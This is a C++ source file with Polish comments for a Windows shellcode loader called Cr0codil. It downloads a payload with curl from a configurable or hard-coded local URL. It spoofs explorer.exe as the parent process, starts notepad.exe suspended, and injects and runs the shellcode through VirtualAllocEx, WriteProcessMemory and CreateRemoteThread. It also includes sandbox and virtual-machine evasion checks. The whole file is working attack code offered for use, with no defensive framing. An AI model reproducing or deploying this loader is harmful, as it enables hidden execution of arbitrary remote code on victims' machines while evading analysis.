// Cr0codil.cpp : Ulepszona wersja z dynamicznym rozmiarem payloadu i konfigurowalnym URL
//

#include <iostream>
#include <windows.h>
#include <IPHlpApi.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cctype>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "IPHlpApi.lib")

bool dynamicAnalysisCheck();
std::string GetConfigUrl(int argc, char* argv[]);

int main(int argc, char* argv[])
{
    // ---------- Pobranie URL payloadu ----------
    std::string payloadUrl = GetConfigUrl(argc, argv);
    printf("Using payload URL: %s\n", payloadUrl.c_str());

    // ---------- Przygotowanie komendy curl ----------
    std::string command = "curl \"" + payloadUrl + "\"";

    FILE* fpipe;
    std::vector<char> shellcode;
    char buffer[4096];
    size_t bytesRead;

    if (0 == (fpipe = (FILE*)_popen(command.c_str(), "rb"))) {
        perror("popen() failed.\n");
        exit(EXIT_FAILURE);
    }

    printf("Downloading payload...\n");

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);

        // Opcjonalne wyświetlanie postępu
        for (size_t i = 0; i < bytesRead; ++i) {
            if (isprint(static_cast<unsigned char>(buffer[i])))
                putchar(buffer[i]);
            else
                putchar('.');
        }
    }
    _pclose(fpipe);

    if (shellcode.empty()) {
        printf("\nNo payload downloaded or empty file.\n");
        return 1;
    }

    printf("\n\nPayload downloaded successfully. Size: %zu bytes\n", shellcode.size());

    // ---------- Pobranie procesu explorer.exe ----------
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    HANDLE hExplorerexe = NULL;

    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);

    for (DWORD i = 0; i < runningProcessesCount; i++) {  // warning C4018: zmiana int -> DWORD
        if (runningProcessesIDs[i] != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
            if (!hProcess) continue;

            char processName[MAX_PATH + 1];
            DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
            if (size == 0) {
                CloseHandle(hProcess);
                continue;
            }
            processName[size] = '\0';
            _strlwr_s(processName);
            if (strstr(processName, "explorer.exe") && hProcess) {
                if (hExplorerexe) CloseHandle(hExplorerexe);
                hExplorerexe = hProcess;
            }
            else {
                CloseHandle(hProcess);
            }
        }
    }

    // Opcjonalne sprawdzenia anty-debug/VM (zakomentowane)
    // bool checkStatus = dynamicAnalysisCheck();
    // if (IsDebuggerPresent() && !checkStatus) { ... }

    // ---------- Blok wykonawczy z czyszczeniem (zastąpienie goto) ----------
    int exitCode = 1;
    HANDLE hThread = NULL;
    void* exec = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOEXA si = { 0 };
    SIZE_T payloadSize = 0;          // deklaracja przed możliwymi skokami
    DWORD oldProtect = 0;            // deklaracja przed możliwymi skokami

    do {
        RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        SIZE_T attributeSize;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
        if (hExplorerexe) {
            UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);
        }
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
            &si.StartupInfo, &pi)) {
            printf("Failed to create process. Error: %d\n", GetLastError());
            break;  // zamiast goto
        }

        printf("Process created with PID: %d\n", pi.dwProcessId);

        payloadSize = shellcode.size();   // inicjalizacja w bezpiecznym miejscu
        exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!exec) {
            printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
            break;
        }

        SIZE_T written;
        if (!WriteProcessMemory(pi.hProcess, exec, shellcode.data(), payloadSize, &written) || written != payloadSize) {
            printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
            break;
        }

        if (!VirtualProtectEx(pi.hProcess, exec, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
            printf("VirtualProtectEx failed. Error: %d\n", GetLastError());
            break;
        }

        hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        if (!hThread) {
            printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
            break;
        }

        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            printf("ResumeThread failed. Error: %d\n", GetLastError());
            break;
        }

        exitCode = 0;   // sukces
    } while (0);

    // ---------- Czyszczenie (odpowiednik process_cleanup) ----------
    if (hThread) CloseHandle(hThread);
    if (exec && pi.hProcess) VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (si.lpAttributeList) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        delete[] reinterpret_cast<byte*>(si.lpAttributeList);
    }
    if (hExplorerexe) CloseHandle(hExplorerexe);

    return exitCode;
}

// ---------- Funkcja pobierająca URL ----------
std::string GetConfigUrl(int argc, char* argv[])
{
    const std::string fallbackUrl = "http://192.168.0.32:8000/payload.bin";

    // 1. Argument wiersza poleceń
    if (argc >= 2) {
        return argv[1];
    }

    // 2. Plik conf.ini w katalogu programu
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string iniPath(exePath);
    size_t lastSlash = iniPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        iniPath = iniPath.substr(0, lastSlash + 1);
    }
    else {
        iniPath = "";
    }
    iniPath += "conf.ini";

    char urlBuffer[1024] = { 0 };
    DWORD result = GetPrivateProfileStringA(
        "Main",           // sekcja
        "PayloadURL",     // klucz
        "",               // wartość domyślna (pusta)
        urlBuffer,
        sizeof(urlBuffer),
        iniPath.c_str()
    );

    if (result > 0 && strlen(urlBuffer) > 0) {
        return std::string(urlBuffer);
    }

    // 3. Fallback
    return fallbackUrl;
}

// ---------- dynamicAnalysisCheck (poprawione ostrzeżenie C4244) ----------
bool dynamicAnalysisCheck() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / 1024 / 1024);
    if (RAMMB < 2048) return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (hDevice == INVALID_HANDLE_VALUE) return false;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return false;
    }
    CloseHandle(hDevice);
    DWORD diskSizeGB = static_cast<DWORD>(
        pDiskGeometry.Cylinders.QuadPart * pDiskGeometry.TracksPerCylinder *
        pDiskGeometry.SectorsPerTrack * pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024
        );
    if (diskSizeGB < 100) return false;

    WIN32_FIND_DATAW findFileData;
    if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnection) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    if (!hRequest) { WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
    }
    DWORD responseLength;
    if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
    }
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    if (!response) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
    }
    if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
        HeapFree(GetProcessHeap(), 0, response);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
    }
    if (response) HeapFree(GetProcessHeap(), 0, response);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnection) WinHttpCloseHandle(hConnection);
    if (hSession) WinHttpCloseHandle(hSession);

    return true;
}